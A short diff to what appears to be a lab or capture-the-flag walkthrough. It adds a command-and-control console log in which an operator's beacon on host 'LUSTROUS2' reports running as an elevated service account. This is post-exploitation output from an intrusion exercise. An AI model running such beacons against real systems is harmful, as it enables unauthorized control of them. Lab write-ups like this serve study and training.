@@ -630,5 +630,11 @@ Then ill just run the agent
 I now have a beacon
 
 ```python
+[12/08 20:53:03] ethan [4ed9dc46] beacon > getuid
+[12/08 20:53:03] [*] Task: get username of current token
+[12/08 20:53:06] [*] Agent called server, sent [12 bytes]
+[12/08 20:53:06] [+] You are 'LUSTROUS2\ShareSvc' (elevated)
 
++--- Task [4ed9dc46] closed ----------------------------------------------------------+
 ```
+
